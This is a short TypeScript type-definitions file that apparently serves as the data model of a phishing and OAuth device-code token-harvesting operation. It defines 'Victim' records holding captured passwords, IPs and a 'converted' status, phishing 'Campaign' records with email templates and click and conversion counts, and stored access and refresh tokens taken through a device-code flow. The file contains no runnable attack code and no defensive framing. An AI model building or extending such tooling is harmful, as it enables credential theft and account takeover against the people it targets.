export interface Victim {
  id: number;
  email: string;
  username: string;
  password: string;
  name: string;
  company: string;
  role: string;
  industry: string;
  phone: string;
  ip: string;
  country: string;
  user_agent: string;
  first_seen: string;
  last_seen: string;
  status: 'new' | 'active' | 'responded' | 'converted';
  score: number;
  notes: string;
  tags: string;
  campaign_id: number;
  session_count: number;
  token_count: number;
  conversations: string;
}

export interface Campaign {
  id: number;
  name: string;
  description: string;
  target_industry: string;
  target_role: string;
  email_template: string;
  status: 'draft' | 'active' | 'completed';
  sent_count: number;
  open_count: number;
  click_count: number;
  reply_count: number;
  conversion_count: number;
  created_at: string;
  updated_at: string;
}

export interface Token {
  id: number;
  victim_id: number;
  token_type: string;
  token_value: string;
  refresh_token: string;
  expires_at: string;
  scope: string;
  created_at: string;
  is_valid: boolean;
}

export interface DeviceFlow {
  device_code: string;
  user_code: string;
  verification_uri: string;
  expires_in: number;
  interval: number;
  status: 'pending' | 'approved' | 'expired';
  created: string;
  approved: string | null;
  username: string | null;
  access_token: string | null;
  refresh_token: string | null;
  id_token: string | null;
  token_type: string;
}
